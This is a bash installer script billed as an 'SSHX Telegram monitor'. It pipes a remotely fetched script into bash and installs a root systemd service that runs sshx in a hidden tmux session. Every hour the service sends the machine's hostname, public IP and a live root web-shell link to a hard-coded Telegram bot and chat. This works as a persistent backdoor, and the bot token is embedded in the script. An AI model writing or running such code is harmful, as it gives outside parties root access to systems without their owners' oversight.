#!/bin/bash

clear
echo "===================================="
echo "   SSHX TELEGRAM MONITOR INSTALLER  "
echo "===================================="

# Detect OS
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
fi

case $OS in
ubuntu|debian)
    UPDATE="apt-get update -y"
    INSTALL="apt-get install -y"
    ;;
centos|rhel|almalinux)
    UPDATE="yum makecache -y"
    INSTALL="yum install -y"
    ;;
fedora)
    UPDATE="dnf makecache -y"
    INSTALL="dnf install -y"
    ;;
*)
    UPDATE="apt-get update -y"
    INSTALL="apt-get install -y"
    ;;
esac

echo "[+] Updating system..."
$UPDATE >/dev/null 2>&1

echo "[+] Installing dependencies..."
$INSTALL curl tmux >/dev/null 2>&1

# Install SSHX jika belum ada
if ! command -v sshx >/dev/null; then
    echo "[+] Installing SSHX..."
    curl -fsSL https://sshx.io/get | bash >/dev/null 2>&1
fi

export PATH=$PATH:$HOME/.sshx/bin

echo "[+] Downloading monitor script..."

cat > /usr/local/bin/sshx-monitor.sh << 'EOF'
#!/bin/bash

BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"

send() {
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
         -d "chat_id=$CHAT_ID" \
         -d "text=$1" \
         -d "parse_mode=HTML" > /dev/null
}

tmux kill-session -t sshxmon 2>/dev/null

tmux new-session -d -s sshxmon bash -c 'sshx'

sleep 5

LINK=$(tmux capture-pane -pt sshxmon | grep -o "https://sshx.io/s/[^ ]*" | head -n1)
HOST=$(hostname)
IP=$(curl -s ifconfig.me)
TIME=$(date)

send "✅ <b>SSHX MONITOR STARTED</b>
Host: $HOST
IP: $IP
Time: $TIME

sshx v0.4.1
➜ Link: $LINK
➜ Shell: /bin/bash"

while true
do
    sleep 3600
    LINK=$(tmux capture-pane -pt sshxmon | grep -o "https://sshx.io/s/[^ ]*" | head -n1)
    TIME=$(date)
    send "✅ <b>SSHX MONITOR UPDATE</b>
Host: $HOST
IP: $IP
Time: $TIME

sshx v0.4.1
➜ Link: $LINK
➜ Shell: /bin/bash"
done
EOF

chmod +x /usr/local/bin/sshx-monitor.sh

echo "[+] Creating systemd service..."

cat > /etc/systemd/system/sshx-monitor.service << EOF
[Unit]
Description=SSHX Telegram Monitor
After=network.target

[Service]
ExecStart=/usr/local/bin/sshx-monitor.sh
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sshx-monitor
systemctl start sshx-monitor

echo ""
echo "===================================="
echo " INSTALLATION COMPLETE"
echo " Service: sshx-monitor"
echo " Status:"
systemctl status sshx-monitor --no-pager
echo "===================================="
